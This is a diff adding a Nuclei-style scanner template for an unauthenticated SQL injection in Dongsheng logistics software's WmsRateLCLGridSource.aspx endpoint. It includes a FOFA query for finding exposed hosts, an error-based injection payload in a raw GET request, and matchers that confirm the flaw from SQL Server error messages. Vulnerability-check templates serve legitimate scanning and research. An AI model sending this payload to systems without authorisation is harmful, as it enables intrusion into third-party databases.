@@ -1,0 +1,32 @@
+id: dongsheng-logistics-wmsratelclgridsource-sqli
+
+info:
+  name: "东胜物流软件 WmsRateLCLGridSource.aspx 接口SQL注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
+          青岛东胜伟业软件有限公司开发的东胜物流信息管理系统是一款集成订单、仓储及运输管理的物流解决方案。该系统 WmsRateLCLGridSource.aspx 组件因输入验证机制缺失，存在可远程利用的SQL注入缺陷。攻击者可通过构造恶意SQL语句实现数据库敏感信息检索（如管理员凭证、用户隐私数据），在具备高权限条件下更可执行任意文件写入操作，从而完成对目标服务器的控制。该漏洞无需身份认证即可触发，存在较高的安全风险。
+  tags: 东胜物流软件
+
+http:
+- raw:
+  - |
+    GET /SeaiInfoLCL/WmsRateLCLGridSource.aspx?handle=getiswmsin&gids=1,2')and 1<@@VERSION-- - HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+    - type: status
+      status:
+        - 500
+    - type: word
+      part: body
+      words:
+        - "Microsoft SQL Server"
+        - "SqlException:"
+        - ".GetMblIsRepeat"
+    - type: regex
+      part: body
+      regex:
+        - "转换成数据类型(.*?)时失败"
+        - "在将(.*?)值"
